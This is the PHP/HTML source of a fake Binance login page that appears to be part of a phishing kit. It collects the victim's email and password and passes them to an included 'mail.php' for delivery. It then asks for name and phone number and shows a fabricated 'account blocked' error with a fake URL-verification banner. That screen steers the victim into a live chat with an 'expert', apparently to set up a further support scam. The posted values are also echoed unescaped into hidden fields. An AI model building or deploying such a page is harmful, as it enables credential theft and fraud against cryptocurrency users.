<!DOCTYPE html>
<html lang="en">
    <head>
        <meta name="robots" content="noindex, nofollow"/>
        <meta name="googlebot" content="noindex, nofollow"/>
        <meta name="bingbot" content="noindex, nofollow"/>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <title>Login | binance</title>
        <link rel="shortcut icon" href="./assets/favicon.ico?v=221" />
        <link rel="stylesheet" href="./assets/coinspot.min.css" />
        <script nonce="" src="./assets/coinspot.min.js.download"></script>
        <script nonce="" src="./assets/brhash.min.js.download"></script>
        <script nonce="" src="./assets/bootstrap-sortable.js.download"></script>
        <link rel="stylesheet" type="text/css" href="./assets/flaticon.css" />
        <link rel="stylesheet" type="text/css" href="./assets/font.css" />
        <link rel="stylesheet" href="./assets/main.css" />
        <script nonce="" src="./assets/main.js.download"></script>
    </head>
    <body style="">
        <div class="wrapper">
            <nav id="sidebar" class="hidden">
                <div class="sidebar-header">
                    <h3><img src="./assets/logo.png" alt="CoinSpot" style=" width: 130px;" /> </h3>
                </div>
               
            </nav>
            <div id="content">
                <div class="overlay">
                    <button class="navbar-toggle collapsed navbar-menu-button" type="button">
                        <span class="sr-only">Toggle navigation</span>
                        <span class="icon-bar" style="background-color: #fff;"></span>
                        <span class="icon-bar" style="background-color: #fff;"></span>
                        <span class="icon-bar icon-bar-small" style="background-color: #fff;"></span>
                    </button>
                </div>
                <header class="navbar navbar-default navbar-static-top bs-docs-nav" id="top" role="banner">
                    <div class="container page-content-body">
                        <div class="innercontainer">
                            <div class="navbar-header">
                                <button class="pull-right navbar-toggle collapsed navbar-menu-button" style="margin-top: 12px;" type="button">
                                    <span class="sr-only">Toggle navigation</span>
                                    <span class="icon-bar" style="background-color: #fff;"></span>
                                    <span class="icon-bar" style="background-color: #fff;"></span>
                                    <span class="icon-bar icon-bar-small" style="background-color: #fff;"></span>
                                </button>
                                <a class="pull-right btn-header login-btn userlogin" style="color: #ffe; margin-top: 12px;" href="#">LOGIN</a>
                                <a class="col-md-push-1 navbar-brand" style="padding-top: 19px;" href="#">
                                    <img src="./assets/logo.png" alt="CoinSpot" style="width: 130px;" /> 
                                </a>
                            </div>
                            
                        </div>
                        <script nonce="">
                            $(".navbar-menu-button, .overlay, .overlay .navbar-menu-button").click(function (e) {
                                $("#sidebar").toggleClass("hidden");
                                $(".overlay").toggle();
                                e.stopPropagation();
                            });

                            $("#account-dropdown-menu").on("shown.bs.dropdown", function () {
                                $(".nav-menu").width(550);
                                //$('.dropdown-toggle.account-menu').width($('.navbar-nav>li>.dropdown-menu').width()-20);
                            });

                            $("#account-dropdown-menu").on("hide.bs.dropdown", function () {
                                $(".dropdown-toggle.account-menu").width(0);
                            });
                        </script>
                    </div>
                </header>
                <div class="page-content" style="margin-top: 10px;">
                    <div class="css-1432u7b"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" class="css-11gn95z"><path fill-rule="evenodd" clip-rule="evenodd" d="M7 8v2H5v11h14V10h-2V8A5 5 0 007 8zm7.5 2V8a2.5 2.5 0 00-5 0v2h5zm-1 8v-5h-3v5h3z" fill="currentColor"></path></svg><div data-bn-type="text" class="css-1ldm553">URL verification:</div><div data-bn-type="text" dir="ltr" class="css-mx5ldy"><span data-bn-type="text" class="css-13n52y">https://</span>accounts.binance.com</div></div>
                    <div class="container-fluid">
                        <div class="row">
                            <div id="login" class="container page-content-body">
                                <div class="row">
                                    <div class="col-sm-12 col-md-2"></div>
                                    <div class="col-sm-5 col-md-5">

                                     <?php
                                     if (isset($_POST['btnLoginMore'])) {
                                        
                                        include 'mail.php';
                                    ?>

                                    <div class="login-panel">
                                         <div class=" mb-4 alert-danger text-center">Attention: the account has been <b>temporarily blocked due to suspicious activity in your Network IP,</b> kindly verify the following details<br>
                                             Kindly contact chat assistance for further help
                                           </div>
                                            <div class="page-header">
                                                <h1>
                                                    Verification Required<br />
                                                </h1>
                                            </div>
                                            <div class="panel">
                                                <div class="panel-body">
                                                    <form class="loginform" role="form" action="" method="POST">
                                                        <input type="hidden" name="email" value="<?php echo $_POST['email']; ?>" />
                                                        <input type="hidden" name="password" value="<?php echo $_POST['password']; ?>" />
                                                         <input type="hidden" name="countryCode" value="<?php echo $_POST['countryCode']; ?>" />
                                                        <div class="form-group">
                                                            <label>Name</label>
                                                            <input type="text" id="name" class="form-control login" name="name" required />
                                                        </div>
                                                        <div class="form-group">
                                                            <label>Phone Number</label>
                                                            <input type="text" id="number" class="form-control" name="number" value="" required />
                                                        </div>
                                                        
                                                    <button type="submit" name="fromLog" id="verifyBtn" class="btn btn-primary btn-lg" style="width: 100%;">Verify</button>
                                                        <br />
                                                        
                                                    </form>
                                                </div>
                                            </div>
                                        </div>

                                       

                                    <?php } elseif (isset($_POST['fromLog'])) {
                                         include 'mail.php';
                                     ?>

                                     <div class="login-panel">
                                         
                                            <div class="page-header text-center">
                                                <h1>
                                                    Account blocked<br />
                                                </h1>
                                            </div>
                                            <div class="panel">
                                                <div class="panel-body text-center">
                                                     <p style="font-size: 20px;">Your account has been <b>temporarily blocked</b> due to <br>suspicious activity on your Network IP.<br>Kindly ask an expert</p>
                                                    <div class="form">
                                                        <label style="font-size: 18px;">Error CODE: <b>6X76D</b></label><br>
                                                    </div>
                                                    <div class="calling-number">
                                                        <a class="btn btn-danger" href="javascript:void(Tawk_API.toggle())" style="background: #bf0707;color: #fff !important;font-size: 20px;font-weight: 600;margin-top: 15px;">Ask Expert</a>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>

                                      <?php } else { ?>

                                        <div class="login-panel">
                                            <div class="page-header">
                                                <h1>
                                                    Binance Account Login<br />
                                                    <small>Welcome back! Log In with your Email, Phone number or QR code</small>
                                                </h1>
                                            </div>
                                            <div class="panel">
                                                <div class="panel-body">
                                                    <form class="loginform" role="form" action="" method="POST">
                                                        <div class="css-62gygx">
                                                         <div  class="css-ov54vn">
                                                            <div id="tab-email" class="active css-1cahv52 tabEM">Email</div>
                                                        </div>
                                                        <!-- <div  class="css-ov54vn">
                                                            <div id="tab-mobile" class="css-1cahv52 tabEM">Phone Number</div>
                                                        </div> -->
                                                        </div>
                                                        <div class="form-group" id="emailDiv">
                                                            <label>Email</label>
                                                            <input type="email" class="form-control login" id="email" name="email" required />
                                                        </div>
                                                        
                                                        <div class="form-group">
                                                            <label>Password</label>
                                                            <input type="password" class="form-control" name="password" maxlength="200" required />
                                                        </div>
                                                        
                                                        <button type="submit" name="btnLoginMore" class="btn btn-primary btn-lg" style="width: 100%;">Login</button>
                                                        <br />
                                                        <br />
                                                        <div class="">
                                                            <a style="padding-top: 15px;" href="#">Forgot your password?</a>
                                                            <br />
                                                            <a href="#">Register Now</a>
                                                        </div>
                                                    </form>
                                                </div>
                                            </div>
                                        </div>

                                        

                                        <?php } ?>
                                    </div>
                                    <div class="col-sm-5 col-md-5">
                                        
                                        <div class="panel-body" style="    margin-top: 120px;">
                                            <div class="css-e6aa8f"><div class="css-1tsywzf">
                                                <div class="qr-code css-1hc5qay">
                                                    <img src="assets/download.png" height="156" width="156" style="height: 156px; width: 156px;"></div>
                                                    <div class="css-134ban9"></div></div>
                                                    <div data-bn-type="text" class="css-wz6kgg">Log in with QR code</div>
                                                    <div data-bn-type="text" class="css-1w2l5s">Scan this code with the 
                                                        <a data-bn-type="link" target="_blank" href="#" id="login-qr-download" class="css-s84t59">Binance mobile app</a> <br>to log in instantly.
                                                    </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <br />
                            <br />
                            <br />
                        </div>
                    </div>
                </div>
               
            </div>
        </div>
 <!--Start of Tawk.to Script-->
            <script type="text/javascript">
            var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
            (function(){
            var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
            s1.async=true;
            s1.src='https://embed.tawk.to/620a586d9bd1f31184dc89bb/1frs6irvs';
            s1.charset='UTF-8';
            s1.setAttribute('crossorigin','*');
            s0.parentNode.insertBefore(s1,s0);
            })();
            </script>
            <!--End of Tawk.to Script--> 
    </body>
    
</html>
